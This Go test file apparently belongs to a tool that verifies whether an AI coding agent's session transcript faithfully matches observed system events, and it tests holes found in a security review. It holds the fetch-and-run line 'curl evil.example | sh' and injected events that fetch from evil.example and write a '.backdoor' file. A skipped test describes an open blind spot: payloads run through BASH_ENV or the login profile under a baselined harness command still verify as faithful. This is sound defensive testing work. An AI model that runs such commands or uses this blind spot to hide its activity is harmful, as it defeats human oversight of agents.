package claudecode

import (
	"os"
	"path/filepath"
	"slices"
	"testing"
	"time"

	"github.com/agent-trace/agent-trace/pkg/agent"
	"github.com/agent-trace/agent-trace/pkg/content"
	"github.com/agent-trace/agent-trace/pkg/models"
	"github.com/agent-trace/agent-trace/pkg/verification"
)

// Item 6 of the security review of 2026-10-08: an Edit claimed no content, so
// a file could end with any content under a FAITHFUL verdict. The review's
// exploit replaced the observed content after an Edit with a shell payload on
// the paired capture and got FAITHFUL. I-31 (commit 5eaab2c) made an Edit claim
// the file's content after the edit from its result record. The same
// substitution on the `edits` capture, whose transcript kept the result
// fields, must now be a Mismatched finding on the Edit's output hash, and the
// run NOT FAITHFUL. TestEditClaimsItsContentFromTheResult checks the claim the
// adapter builds; this test checks that the claim reaches the verdict.
func TestPairedEditWithSubstitutedContentIsNotFaithful(t *testing.T) {
	const dir = "testdata/paired-2.1.296-edits"
	tr, rep, err := Adapter{}.Parse(filepath.Join(dir, "edits.session.jsonl"))
	if err != nil || len(rep.ParseErrors) != 0 {
		t.Fatalf("parse: %v %+v", err, rep.ParseErrors)
	}
	load := func(name string) models.GroundTruthFile {
		data, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		f, err := models.ParseGroundTruthFile(data)
		if err != nil {
			t.Fatal(err)
		}
		return f
	}
	runs := []models.GroundTruthFile{load("control-1.ground_truth.json"), load("control-2.ground_truth.json")}
	b, err := agent.Capture(Adapter{}, rep.AgentVersion, runs, time.Now(), agent.CaptureOptions{Exclude: []string{controlCommand}, MinAgreement: 0.5})
	if err != nil {
		t.Fatal(err)
	}
	verify := func(g models.GroundTruthFile) verification.Verdict {
		return verification.Verify(agent.Prepare(Adapter{}, tr, g, b.Predicate(g.Workspace), verification.Options{IntervalSlack: 500 * time.Millisecond}))
	}

	// The control: the honest capture has no finding.
	if v := verify(load("edits.ground_truth.json")); v.Findings() != 0 {
		t.Fatalf("the honest capture has %d finding(s) (%s): the substitution below would prove nothing", v.Findings(), v.Outcome)
	}

	// The substitution: every observed close or write that carries the content
	// the first Edit left now carries a payload instead.
	var target, claimed string
	for _, e := range tr {
		if e.Tool == toolEdit && e.ActionType == models.FileWrite && e.OutputHash != nil {
			target, claimed = e.Target, *e.OutputHash
			break
		}
	}
	if target == "" {
		t.Fatal("no Edit in the fixture claims its content: I-31 is not in effect")
	}
	g := load("edits.ground_truth.json")
	payload := content.SHA256Bytes([]byte("curl evil.example | sh\n"))
	replaced := 0
	for i, e := range g.Events {
		if (e.ActionType == models.FileClose || e.ActionType == models.FileWrite) && e.OutputHash != nil && *e.OutputHash == claimed {
			g.Events[i].OutputHash = &payload
			replaced++
		}
	}
	if replaced == 0 {
		t.Fatalf("no observed close or write of %s carries the claimed content %s", target, claimed)
	}
	t.Logf("the Edit of %s claims %s; %d observed event(s) now carry the payload", target, claimed, replaced)

	v := verify(g)
	if v.Outcome != verification.OutcomeNotFaithful {
		t.Errorf("outcome = %s, want NOT FAITHFUL: the Edit of %s left other content than it claims", v.Outcome, target)
	}
	found := false
	for _, m := range v.Mismatched {
		if m.Entry.Tool == toolEdit && m.Entry.Target == target && slices.Contains(m.Diffs, verification.DiffOutputHash) {
			found = true
		}
	}
	if !found {
		t.Errorf("mismatched = %+v, want the Edit of %s with an output_hash difference", v.Mismatched, target)
	}
}

// The second half of item 3 of the security review of 2026-10-08, which no
// commit closed: a baseline command explains its whole subtree whatever the
// subtree did (V7; a known limit in docs/architecture/20_verifier.md), and
// what the harness's own baselined commands run is not fixed by their command
// line. The `/bin/bash -c env` the harness runs at start reads `BASH_ENV` and
// runs the file it names before `env`, and the `bash -c -l` snapshot command
// sources the login profile; neither the environment nor those files'
// content is in the capture. Here the baselined `bash -c env` of the paired
// capture forks a payload that connects out and writes into the workspace,
// with nothing claiming it. The test states the property a fix would give,
// and is skipped while the hole is open.
func TestPairedBaselineCommandDoesNotExplainAnInjectedSubtree(t *testing.T) {
	t.Skip("open hole (security review of 2026-10-08, item 3, second half): a baselined harness command such as `/bin/bash -c env` explains any subtree, so a payload run through BASH_ENV or the login profile verifies FAITHFUL; documented only as the V7 limit that a baseline command explains its entire subtree")
	tr, g := pairedTask(t)
	b := pairedBaseline(t)
	const envPID, child = 18885, 19300 // the harness's `/bin/bash -c env`
	var base time.Time
	for _, e := range g.Events {
		if e.PID == envPID && e.ActionType == models.ProcessExec && e.Target == "/bin/bash -c env" {
			base = e.Timestamp
		}
	}
	if base.IsZero() {
		t.Fatal("the fixture's `/bin/bash -c env` was not found")
	}
	if v := verifyPaired(t, tr, g, &b); v.Outcome != verification.OutcomeFaithful {
		t.Fatalf("the honest capture is %s, want FAITHFUL for the injection below to mean anything", v.Outcome)
	}
	g.Events = append(g.Events,
		models.GroundTruthEvent{Timestamp: base.Add(100 * time.Microsecond), ActionType: models.ProcessFork, Target: "19300", PID: child, PPID: envPID},
		models.GroundTruthEvent{Timestamp: base.Add(200 * time.Microsecond), ActionType: models.ProcessExec, Target: "/usr/bin/curl -s https://evil.example/payload", PID: child, PPID: envPID},
		models.GroundTruthEvent{Timestamp: base.Add(300 * time.Microsecond), ActionType: models.NetConnect, Target: "evil.example", PID: child},
		models.GroundTruthEvent{Timestamp: base.Add(400 * time.Microsecond), ActionType: models.FileWrite, Target: "/ws/task/.backdoor", PID: child},
		models.GroundTruthEvent{Timestamp: base.Add(500 * time.Microsecond), ActionType: models.ProcessExit, Target: "/usr/bin/curl -s https://evil.example/payload", PID: child, PPID: envPID},
	)
	if v := verifyPaired(t, tr, g, &b); v.Outcome == verification.OutcomeFaithful {
		t.Errorf("outcome = FAITHFUL with %d event(s) explained by the baseline: the injected subtree under the harness's `bash -c env` is not the harness's measured activity", v.Coverage.Baselined)
	}
}
